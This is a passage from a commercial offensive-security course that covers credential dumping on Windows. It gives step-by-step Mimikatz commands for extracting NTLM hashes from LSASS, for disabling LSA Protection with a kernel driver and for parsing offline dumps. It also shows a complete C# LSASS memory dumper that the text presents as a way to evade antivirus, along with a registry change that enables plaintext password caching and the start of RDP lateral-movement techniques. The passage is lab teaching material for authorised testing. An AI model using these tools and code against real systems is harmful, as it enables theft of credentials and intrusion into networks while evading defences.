and a service ticket, service authentication begins. 
First, the client sends an Application Request (AP_REQ), which includes the username and a 
timestamp encrypted with the session key associated with the service ticket along with the 
service ticket itself. 
The service decrypts the service ticket using its own password hash, extracts the session key 
from it, and decrypts the supplied username. If the usernames match, the request is accepted. 
Before access is granted, the service inspects the supplied group memberships in the service 
ticket and assigns appropriate permissions to the user, after which the user may make use of the 
service as required. 
This protocol may seem complicated and perhaps even convoluted, but it was designed to 
mitigate various network attacks and prevent the use of fake credentials. 
 
756 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
490 
Now that we have explored the foundations of Kerberos authentication, let’s look at how we can 
dump cached credentials with Mimikatz. 
12.3.2 
Mimikatz 
In this section, we’ll discuss how Mimikatz may be used to extract credentials from memory due 
to caching requirements of the Kerberos protocol. We’ll also discuss Local Security Authority 
(LSA) protection757 and how it can be bypassed. 
Due to the automatic renewal of TGTs, password hashes are cached in the Local Security 
Authority Subsystem Service (LSASS) memory space. 
If we gain access to these hashes, we could crack them to obtain the clear text password or 
reuse them to perform various actions (which we’ll discuss in a later module). 
Since LSASS is part of the operating system and runs as SYSTEM, we need SYSTEM (or local 
administrator) permissions to gain access to the hashes stored on a target. In addition, the data 
structures are not publicly documented and they are encrypted with an LSASS-stored key. 
Mimikatz,758 written by security researcher Benjamin Delpy,759 is a powerful tool that we can use 
to extract and manipulate credentials, tokens, and privileges in Windows. In this section, we’ll 
specifically use it to dump cached domain credentials and use it for other purposes later in this 
module. 
After launching Mimikatz from an elevated command prompt on our Windows 10 victim machine, 
we’ll have to tamper with the memory of the LSASS process, which is normally not allowed since 
it belongs to the SYSTEM user and not the current offsec user. 
However, as administrator, the offsec user can use SeDebugPrivilege760 to read and modify a 
process under the ownership of a different user. To do this, we’ll use the Mimikatz 
privilege::debug command to enable the SeDebugPrivilege by calling AdjustTokenPrivileges as 
shown in Listing 588. 
C:\Tools\Mimikatz> mimikatz.exe 
 
  .#####.   mimikatz 2.2.0 (x64) #18362 Jul 10 2019 23:09:43 
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) 
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) 
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz 
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/ 
 
mimikatz # privilege::debug 
Privilege '20' OK 
Listing 588 - Enabling SeDebugPrivilege with Mimikatz 
 
757 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-
management/configuring-additional-lsa-protection 
758 (Benjamin Delpy, 2020), https://github.com/gentilkiwi/mimikatz 
759 (Benjamin Delpy, 2020), https://github.com/gentilkiwi 
760 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
491 
Once we have enabled the SeDebugPrivilege privilege, we’ll dump all cached passwords and 
hashes from LSASS with sekurlsa::logonpasswords: 
mimikatz # sekurlsa::logonpasswords 
 
Authentication Id : 0 ; 32785103 (00000000:01f442cf) 
Session           : Interactive from 1 
User Name         : offsec 
Domain            : corp1 
Logon Server      : DC01 
Logon Time        : 11/18/2019 1:53:44 AM 
SID               : S-1-5-21-1364860144-3811088588-1134232237-1106 
        msv : 
         [00000003] Primary 
         * Username : offsec 
         * Domain   : corp1 
         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e 
         * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3 
         * DPAPI    : 4f66481a65cbbdbda1dbe9554c1bd0ed 
        tspkg : 
        wdigest : 
         * Username : offsec 
         * Domain   : corp1 
         * Password : (null) 
        kerberos : 
         * Username : offsec 
         * Domain   : CORP1.COM 
         * Password : (null) 
        ssp : 
        credman : 
... 
Listing 589 - Dumping credentials with Mimikatz 
The inner workings of the command are quite complex and beyond the scope of this module due 
to the inherent encryption and undocumented structures employed by LSASS, but the results 
show the NTLM hash of the domain offsec user as shown in the highlighted section of Listing 
589. 
The wdigest761 authentication protocol requires a clear text password, but it is 
disabled in Windows 8.1 and newer. We can enable it by creating the 
UseLogonCredential registry value in the path 
HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest. Once we 
set this value to “1”, the clear text password will be cached in LSASS after 
subsequent logins. 
 
761 (Kevin Joyce, 2019), https://blog.stealthbits.com/wdigest-clear-text-passwords-stealing-more-than-a-hash/ 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
492 
Since 2012 (when Mimikatz was released and cached credential dumping was popularized), 
Microsoft has developed mitigation techniques: LSA Protection and Windows Defender Credential 
Guard.762 In this module, we will focus on LSA protection. 
As previously mentioned, Windows divides its processes into four distinct integrity levels. An 
additional mitigation level, Protected Processes Light (PPL)763 was introduced from Windows 8 
onwards, which can be layered on top of the current integrity level. 
In essence, this means that a process running at SYSTEM integrity cannot access or modify the 
memory space of a process executing at SYSTEM integrity with PPL enabled. To demonstrate 
this, we’ll log on to the Windows 2019 server appsrv01 as the admin user. 
LSASS supports PPL protection,764 which can be enabled in the registry. This is done through the 
RunAsPPL DWORD value in HKLM\SYSTEM\CurrentControlSet\Control\Lsa with a value of 1. 
This protection mechanism is disabled by default due to third-party compatibility issues. On 
appsrv01 LSA Protection has already been configured. 
When LSASS is executing as a Protected Process Light, Mimikatz fails due to insufficient 
permissions as shown in Listing 590. 
C:\Tools\Mimikatz> mimikatz.exe 
 
  .#####.   mimikatz 2.2.0 (x64) #18362 Aug 14 2019 01:31:47 
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) 
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) 
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz 
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/ 
 
mimikatz # privilege::debug 
Privilege '20' OK 
 
mimikatz # sekurlsa::logonpasswords 
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005) 
Listing 590 - Failure to dump passwords due to insufficient permissions 
The sekurlsa::logonpasswords command returns the error value 0x00000005 (Access 
denied). 
PPL protection is controlled by a bit residing in the EPROCESS kernel object associated with the 
target process. If we could obtain code execution in kernel space, we could disable the LSA 
protection and dump the credentials. 
Luckily, this can be achieved with Mimikatz since it comes bundled with the mimidrv.sys driver. 
 
762 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows/security/identity-protection/credential-guard/credential-guard 
763 (Alex Ionescu, 2014), http://www.nosuchcon.org/talks/2014/D3_05_Alex_ionescu_Breaking_protected_processes.pdf 
764 (Microsoft, 2020), https://docs.microsoft.com/en-us/windows-server/security/credentials-protection-and-
management/configuring-additional-lsa-protection 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
493 
We must be local administrator or SYSTEM to dump the credentials, which means we will also 
have the SeLoadDriverPrivilege privilege and the ability to load any signed drivers. Mimikatz can 
load the mimidrv.sys driver with the !+ command: 
mimikatz # !+ 
[*] 'mimidrv' service not present 
[+] 'mimidrv' service successfully registered 
[+] 'mimidrv' service ACL to everyone 
[+] 'mimidrv' service started 
Listing 591 - Loading mimidrv.sys into the kernel 
Once the driver is loaded, we can use it to disable the PPL protection for LSASS through the 
!processprotect command while supplying the /process: option to specify the name of the 
process and the /remove flag to disable PPL as shown in Listing 592. 
mimikatz # !processprotect /process:lsass.exe /remove 
Process : lsass.exe 
PID 536 -> 00/00 [0-0-0] 
Listing 592 - Disabling LSA Protection with Mimikatz 
While this technique will disable the LSA Protection it does require that we upload the mimidrv.sys 
driver to the victim machine, which may trigger antivirus. 
Next, we’ll again attempt to dump the cached credentials with sekurlsa::logonpasswords: 
mimikatz # sekurlsa::logonpasswords 
 
Authentication Id : 0 ; 225064 (00000000:00036f28) 
Session           : Interactive from 1 
User Name         : admin 
Domain            : corp1 
Logon Server      : DC01 
Logon Time        : 11/19/2019 2:38:17 AM 
SID               : S-1-5-21-1364860144-3811088588-1134232237-1107 
        msv : 
         [00000003] Primary 
         * Username : admin 
         * Domain   : corp1 
         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e 
         * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3 
         * DPAPI    : c4ba63d00510613add0c6fe2b3e65f16 
        tspkg : 
        wdigest : 
         * Username : admin 
         * Domain   : corp1 
         * Password : (null) 
        kerberos : 
         * Username : admin 
         * Domain   : CORP1.COM 
         * Password : (null) 
        ssp : 
        credman : 
... 
Listing 593 - Dumping credentials after disabling LSA protection 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
494 
According to this output, we have bypassed LSA protection and have obtained the domain 
admin’s user NTLM hash. 
In the next section, we’ll discuss how to dump LSASS memory without Mimikatz. 
12.3.2.1 Exercises 
1. 
Log on to the Windows 10 victim VM as the offsec user and dump the cached credentials 
with Mimikatz. 
2. 
Dump the cached credentials by calling the Mimikatz kiwi765 extension from Meterpreter. 
3. 
Log on to the Windows 2019 server appsrv01 as the admin user and attempt to dump the 
cached credentials with Mimikatz. 
4. 
Use the Mimikatz driver to disable LSA Protection on appsrv01 and dump the credentials. 
12.4 Processing Credentials Offline 
In this section, we’ll process the credentials “offline” by dumping the required memory section 
from the target’s LSASS and uploading it to a different Windows machine, where we can safely 
extract the credentials. This will help avoid detection since Mimikatz will neither be uploaded to, 
nor run from, the target machine. 
12.4.1 
Memory Dump 
First, we’ll dump the process memory of LSASS. Windows allows us to create a dump file,766 
which is a snapshot of a given process. This dump includes loaded libraries and application 
memory. In this example, we’ll create the dump file with Task Manager. 
To open Task Manager we’ll right-click the task bar and select it. Next, we’ll navigate to the Details 
tab, locate the lsass.exe process, right-click it and choose Create dump file as shown in Figure 
229: 
 
765 (Rapid7, 2017), https://blog.rapid7.com/2017/01/27/weekly-metasploit-wrapup-2/ 
766 (Microsoft, 2018), https://docs.microsoft.com/en-us/visualstudio/debugger/using-dump-files?view=vs-2019 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
495 
 
Figure 229: Task Manager allows us to create a dump file 
After dumping the process memory, the location of the dump file is presented in a popup (Figure 
230): 
 
Figure 230: Dump file prompt 
Once the dump file is created, we can copy it from the target to our local Windows client where 
we can parse it with Mimikatz. 
When opening a dump file in Mimikatz, the target machine and the processing 
machine must have a matching OS and architecture. For example, if the dumped 
LSASS process was from a Windows 10 64-bit machine; we must also parse it on 
a Windows 10 or Windows 2016/2019 64-bit machine. However, processing the 
dump file requires neither an elevated command prompt nor privilege::debug. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
496 
In this example, we’ll simulate offline parsing by copying the dump file to the C:\Toools\Mimikatz\ 
folder of the Windows 10 victim VM and we’ll process it with Mimikatz there. 
First, we’ll run sekurlsa::minidump, supplying the name of the dump file to parse, followed by 
sekurlsa::logonpasswords to dump cached credentials: 
C:\Tools\Mimikatz> mimikatz.exe 
 
  .#####.   mimikatz 2.2.0 (x64) #18362 Jul 10 2019 23:09:43 
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) 
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com ) 
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz 
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com ) 
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/ 
 
mimikatz # sekurlsa::minidump lsass.dmp 
Switch to MINIDUMP : 'lsass.dmp' 
 
mimikatz # sekurlsa::logonpasswords 
Opening : 'lsass.dmp' file for minidump... 
 
Authentication Id : 0 ; 32785103 (00000000:01f442cf) 
Session           : RemoteInteractive from 1 
User Name         : admin 
Domain            : corp1 
Logon Server      : DC01 
Logon Time        : 11/18/2019 1:53:44 AM 
SID               : S-1-5-21-1364860144-3811088588-1134232237-1106 
        msv : 
         [00000003] Primary 
         * Username : admin 
         * Domain   : corp1 
         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e 
         * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3 
         * DPAPI    : 4f66481a65cbbdbda1dbe9554c1bd0ed 
        tspkg : 
        wdigest : 
         * Username : admin 
         * Domain   : corp1 
         * Password : (null) 
        kerberos : 
         * Username : admin 
         * Domain   : CORP1.COM 
         * Password : (null) 
        ssp : 
        credman : 
... 
Listing 594 - Loading and parsing a dump file with Mimikatz 
This successfully dumps the admin domain user’s credentials, and does not require Mimikatz on 
the target machine. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
497 
There is, however, one obvious disadvantage to this technique: Task Manager cannot be run as a 
command line tool, so we’ll need GUI access to the target. Alternatively, we can create the dump 
file from the command line with ProcDump767 from SysInternals. 
Since ProcDump may also have a signature that could be recognized, in the next section we’ll 
build our own code to create the dump file. 
12.4.1.1 Exercises 
1. 
Use Task Manager to create a dump file on your Windows 10 victim VM and parse it with 
Mimikatz. 
2. 
Use ProcDump located in the C:\Tools\SysInternals folder to create a dump file and parse it 
with Mimikatz. 
12.4.2 
MiniDumpWriteDump 
In this section, we’ll develop our own C# application to execute a memory dump that we can 
parse with Mimikatz. 
When Task Manager and ProcDump create a dump file, they are invoking the Win32 
MiniDumpWriteDump768 API. This means that we can write our own application in C# that does 
the same thing. 
To begin, we’ll go over the function prototype as shown in Listing 595: 
BOOL MiniDumpWriteDump( 
  HANDLE                            hProcess, 
  DWORD                             ProcessId, 
  HANDLE                            hFile, 
  MINIDUMP_TYPE                     DumpType, 
  PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam, 
  PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam, 
  PMINIDUMP_CALLBACK_INFORMATION    CallbackParam 
); 
Listing 595 - MiniDumpWriteDump function prototype 
This function requires a lot of arguments, but only the first four are needed for our use case. The 
first two arguments (hProcess and ProcessId) must be a handle to LSASS and the process ID of 
LSASS, respectively. 
The third argument (hFile) is a handle to the file that will contain the generated memory dump, 
and the fourth (DumpType) is an enumeration type769 that we’ll set to MiniDumpWithFullMemory 
(or its numerical value of “2”) to obtain a full memory dump. 
With the foundational understanding of the API in place, we’ll create a Visual Studio C# console 
app on the Windows 10 client called “MiniDump”, select Release build and set the CPU 
architecture to 64-bit. 
 
767 (Microsoft, 2017), https://docs.microsoft.com/en-us/sysinternals/downloads/procdump 
768 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/minidumpapiset/nf-minidumpapiset-
minidumpwritedump 
769 (Microsoft, 2018), https://docs.microsoft.com/en-gb/windows/win32/api/minidumpapiset/ne-minidumpapiset-minidump_type 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
498 
Next, we’ll use pinvoke.net to find the P/Invoke translated DllImport statement for 
MiniDumpWriteDump as shown in Listing 596: 
using System; 
using System.Runtime.InteropServices; 
 
namespace MiniDump 
{ 
    class Program 
    { 
        [DllImport("Dbghelp.dll")] 
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId,  
          IntPtr hFile, int DumpType, IntPtr ExceptionParam,  
          IntPtr UserStreamParam, IntPtr CallbackParam); 
... 
Listing 596 - DllImport statement for MiniDumpWriteDump 
Before we can call MiniDumpWriteDump, we have to set up the four required arguments. First, 
we’ll obtain the process ID of LSASS and open a handle to it. 
To get the process ID, we can use the GetProcessesByName770 method of the Process771 class 
(supplying the process name as a string) and select the Id property: 
Process[] lsass = Process.GetProcessesByName("lsass"); 
int lsass_pid = lsass[0].Id; 
Listing 597 - Obtaining the process ID of LSASS 
We must include the System.Diagnostics namespace to make use of the Process class. 
We can obtain a handle to the LSASS process with the Win32 OpenProcess772 API, just as we 
would with process injection. 
We must remember to execute the compiled application from an elevated 
command prompt, otherwise OpenProcess will fail. 
We’ll include the DllImport statement for OpenProcess and supply the arguments for full access, 
no inheritance, and the process ID of LSASS: 
using System; 
using System.Diagnostics; 
using System.Runtime.InteropServices; 
 
namespace MiniDump 
{ 
    class Program 
 
770 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.diagnostics.process.getprocessesbyname?view=netframework-4.8 
771 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.diagnostics.process?view=netframework-4.8 
772 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
499 
    { 
        [DllImport("Dbghelp.dll")] 
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId,  
          IntPtr hFile, int DumpType, IntPtr ExceptionParam,  
          IntPtr UserStreamParam, IntPtr CallbackParam); 
 
        [DllImport("kernel32.dll")] 
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle,  
          int processId); 
 
        static void Main(string[] args) 
        { 
            Process[] lsass = Process.GetProcessesByName("lsass"); 
            int lsass_pid = lsass[0].Id; 
 
            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid); 
... 
Listing 598 - Obtaining a handle to LSASS 
Now that we have the first two arguments in place, we must set up the dump file. Instead of using 
the Win32 CreateFile773 API, we can take advantage of the FileStream774 class along with its 
constructor. 
To instantiate the FileStream object, we must supply two arguments: the name (lsass.dmp) and 
full path of the file and the FileMode.Create775 option, indicating that we want to create a new file. 
We’ll also include the System.IO namespace to use the FileStream class: 
using System; 
using System.Diagnostics; 
using System.Runtime.InteropServices; 
using System.IO; 
 
namespace MiniDump 
{ 
    class Program 
    { 
        [DllImport("Dbghelp.dll")] 
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId,  
          IntPtr hFile, int DumpType, IntPtr ExceptionParam,  
          IntPtr UserStreamParam, IntPtr CallbackParam); 
 
        [DllImport("kernel32.dll")] 
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle,  
          int processId); 
 
        static void Main(string[] args) 
        { 
            FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp", 
FileMode.Create); 
            Process[] lsass = Process.GetProcessesByName("lsass"); 
 
773 (Microsoft, 2018), https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea 
774 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.io.filestream?view=netframework-4.8 
775 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.io.filemode?view=netframework-4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
500 
            int lsass_pid = lsass[0].Id; 
 
            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid); 
... 
Listing 599 - Creating the empty dump file 
Now that we have all the pieces in place, we can invoke MiniDumpWriteFile. When supplying the 
file handle argument to MiniDumpWriteDump, we must convert it to a C-style file handle through 
the DangerousGetHandle776 method of the SafeHandle777 class. 
using System; 
using System.Diagnostics; 
using System.Runtime.InteropServices; 
using System.IO; 
 
namespace MiniDump 
{ 
    class Program 
    { 
        [DllImport("Dbghelp.dll")] 
        static extern bool MiniDumpWriteDump(IntPtr hProcess, int ProcessId,  
          IntPtr hFile, int DumpType, IntPtr ExceptionParam,  
          IntPtr UserStreamParam, IntPtr CallbackParam); 
 
        [DllImport("kernel32.dll")] 
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle,  
          int processId); 
 
        static void Main(string[] args) 
        { 
            FileStream dumpFile = new FileStream("C:\\Windows\\tasks\\lsass.dmp", 
FileMode.Create); 
            Process[] lsass = Process.GetProcessesByName("lsass"); 
            int lsass_pid = lsass[0].Id; 
 
            IntPtr handle = OpenProcess(0x001F0FFF, false, lsass_pid); 
            bool dumped = MiniDumpWriteDump(handle, lsass_pid, 
dumpFile.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, 
IntPtr.Zero); 
Listing 600 - Calling MiniDumpWriteDump to create a dump file of LSASS 
After compiling the project, we can execute it from an elevated command prompt and generate a 
dump file as shown in Listing 601: 
C:\Windows\Tasks> 
\\192.168.119.120\visualstudio\MiniDump\MiniDump\bin\x64\Release\MiniDump.exe 
 
C:\Windows\Tasks> dir 
 Volume in drive C has no label. 
 
776 (Microsoft, 2020), https://docs.microsoft.com/en-
us/dotnet/api/system.runtime.interopservices.safehandle.dangerousgethandle?view=netframework-4.8 
777 (Microsoft, 2020), https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.safehandle?view=netframework-
4.8 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
501 
 Volume Serial Number is 564D-6BAE 
 
 Directory of C:\Windows\Tasks 
 
11/19/2019  06:20 AM    <DIR>          . 
11/19/2019  06:20 AM    <DIR>          .. 
11/19/2019  06:20 AM        49,099,206 lsass.dmp 
               1 File(s)     49,099,206 bytes 
               2 Dir(s)   5,823,295,488 bytes free 
Listing 601 - Creating a LSASS dump file from our custom C# application 
With the dump file created, we can run Mimikatz to parse it as we did in the last section: 
C:\Windows\Tasks> c:\Tools\Mimikatz\mimikatz.exe 
... 
mimikatz # sekurlsa::minidump lsass.dmp 
Switch to MINIDUMP : 'lsass.dmp' 
 
mimikatz # sekurlsa::logonpasswords 
Opening : 'lsass.dmp' file for minidump... 
 
Authentication Id : 0 ; 32785103 (00000000:01f442cf) 
Session           : Interactive from 1 
User Name         : offsec 
Domain            : corp1 
Logon Server      : DC01 
Logon Time        : 11/18/2019 1:53:44 AM 
SID               : S-1-5-21-1364860144-3811088588-1134232237-1106 
        msv : 
         [00000003] Primary 
         * Username : offsec 
         * Domain   : corp1 
         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e 
         * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3 
         * DPAPI    : 4f66481a65cbbdbda1dbe9554c1bd0ed 
        tspkg : 
        wdigest : 
         * Username : offsec 
         * Domain   : corp1 
         * Password : (null) 
        kerberos : 
         * Username : offsec 
         * Domain   : CORP1.COM 
         * Password : (null) 
        ssp : 
        credman : 
... 
Listing 602 - Parsing the dump file with Mimikatz 
The output of Listing 602 reveals that our custom C# application did, in fact, create a valid dump 
file for LSASS. 
By stepping away from pre-developed tools, we have improved our tradecraft and likely avoided 
antivirus detection. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
502 
12.4.2.1 Exercises 
1. 
Write and compile a C# application that creates a dump file from LSASS as shown in this 
section. 
2. 
Create a PowerShell script that calls MiniDumpWriteDump to create a dump file. 
12.5 Wrapping Up 
In this module, we discussed the various authentication mechanisms and privilege levels 
implemented in Windows and demonstrated various tools and techniques to obtain credentials 
and escalate our privileges. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
503 
 
13 Windows Lateral Movement 
Gaining access to a client workstation or a server is only the first step in a typical penetration test. 
Once we gain initial access, our goal is to compromise more of the organization’s assets, either to 
obtain more privileged access, or gain access to confidential information. The course of action is 
dictated by the goals of the test. 
We will often use lateral movement techniques to compromise additional machines inside the 
target network. For example, we may continue a phishing campaign from a compromised client 
in an attempt to send email from an internal account that is not subject to the external security 
checks and may be more trusted. Another approach may be to locate and exploit vulnerable 
software on internal servers since these may be patched less often than servers directly exposed 
to the Internet. We may even be able to reuse stolen credentials to obtain access to additional 
systems. 
Although there are many lateral movement techniques we could leverage against a Windows 
infrastructure, most rely on NTLM hash or Kerberos ticket reuse. The most valuable techniques 
work equally well against both workstations and servers. 
In this module, we will focus on several Windows-based lateral movement techniques that do not 
rely on specific software vulnerabilities. Each technique offers a certain element of stealth and 
can improve our level of access. 
There are only a few known lateral movement techniques against Windows that 
reuse stolen credentials such as PsExec,778 WMI,779 DCOM,780 and 
PSRemoting.781 Most of these techniques have been around for years and are 
well known and weaponized.782 Some require clear text credentials and others 
work with a password hash only. Typically, they all require local administrator 
access to the target machine. 
We’ll begin by abusing the Windows Remote Desktop Protocol (RDP).783 Next, we’ll describe the 
PsExec technique that will allow us to create a custom implementation that is slightly more 
stealthy. 
 
778 (Mantvydas Baranauskas, 2019), https://ired.team/offensive-security/lateral-movement/lateral-movement-with-psexec 
779 (Mantvydas Baranauskas, 2018), https://ired.team/offensive-security/lateral-movement/t1047-wmi-for-lateral-movement 
780 (Matt Nelson, 2017), https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/ 
781 (Penetration Testing Lab, 2018), https://pentestlab.blog/2018/05/15/lateral-movement-winrm/ 
782 (Steven F, 2020), https://github.com/0xthirteen/SharpMove 
783 (Microsoft, 2020), https://support.microsoft.com/en-us/help/186607/understanding-the-remote-desktop-protocol-rdp 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
504 
13.1 Remote Desktop Protocol 
RDP is a multichannel network protocol developed by Microsoft and is used for communication 
between Terminal Servers and their clients. It is commonly used in many corporate environments 
for remote administration using the Windows-native Remote Desktop Connection application. 
This can also serve as an excellent tool for lateral movement that will blend in with an 
organization’s common network usage pattern. In the following sections, we will discuss various 
RDP attacks including the abuse of standard RDP sessions, passing the hash, proxying RDP, and 
stealing clear text credentials. 
13.1.1 
Lateral Movement with RDP 
Although RDP was designed for system administrators, it can also be abused by attackers. For 
example, if we have gained access to clear text credentials for a domain user and that user is a 
local administrator of the target machine, we can simply use mstsc.exe (the native RDP 
application) to gain access to that machine. 
Let’s take a moment to demonstrate this. We’ll connect to the Windows 10 client as the dave user 
from our Kali machine with rdesktop. From there, we’ll run mstsc.exe and connect to appsrv01 
as shown in Figure 231. 
 
Figure 231: Performing a regular RDP login 
Once connected, we are given control of the appsrv01 desktop. 
Obviously, this is an excellent tool for lateral movement, even though in this case we relied on 
clear text credentials since the tool does not accept password hashes. However, this technique 
blends in with normal network traffic patterns, which could help evade detection. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
505 
 
Connecting to a workstation with Remote Desktop will disconnect any existing 
session. The /admin flag allows us to connect to the admin session, which does 
not disconnect the current user if we perform the login with the same user. 
When an RDP connection is created, the NTLM hashes will reside in memory for the duration of 
the session. The session does not terminate without a proper logout, which means simply 
disconnecting from the sessions will leave the hashes in memory. This creates an attack surface 
in which we can harvest the credentials if we compromise the machine. 
Let’s examine how the dave user’s credentials are handled on the appsrv01 target machine. If we 
run C:\Tools\mimikatz.exe from an administrative console, disable the LSA protection 
(!processprotect), and dump credentials (sekurlsa::logonpasswords), we’ll find the NTLM 
hash of the dave user: 
mimikatz # privilege::debug 
Privilege '20' OK 
 
mimikatz # !+ 
[*] 'mimidrv' service not present 
[+] 'mimidrv' service successfully registered 
[+] 'mimidrv' service ACL to everyone 
[+] 'mimidrv' service started 
 
mimikatz # !processprotect /process:lsass.exe /remove 
Process : lsass.exe 
PID 532 -> 00/00 [0-0-0] 
 
mimikatz # sekurlsa::logonpasswords 
 
Authentication Id : 0 ; 2225141 (00000000:0021f3f5) 
Session           : RemoteInteractive from 2 
User Name         : dave 
Domain            : corp1 
Logon Server      : DC01 
Logon Time        : 3/18/2020 3:02:47 PM 
SID               : S-1-5-21-1364860144-3811088588-1134232237-2102 
        msv : 
         [00000003] Primary 
         * Username : dave 
         * Domain   : corp1 
         * NTLM     : 2892d26cdf84d7a70e2eb3b9f05c425e 
         * SHA1     : a188967ac5edb88eca3301f93f756ca8e94013a3 
         * DPAPI    : 6904835e1ba09b07bbef109c34d515d6 
... 
Listing 603 - NTLM credentials in memory after RDP login 
In this case, we expected these cached credentials. This means that if we happen to compromise 
a well-used server (like a jump server), we could dump any of those cached credentials as well. 
OS-555704 RAYMOND ALLEN SORENG
 
 
Evasion Techniques and Breaching Defenses 
 
PEN-300 v1.0 - Copyright © 2021 Offensive Security Ltd. All rights reserved. 
506 
This example highlights an interactive login scenario.784 Since we ran it over RDP from a different 
machine, it’s also considered a remote login. As previously mentioned, clear text credentials are 
required for all interactive logins. 
In an attempt to prevent attackers from stealing credentials on a compromised server, Microsoft 
introduced RDP with restricted admin mode,785 which allows system administrators to perform a 
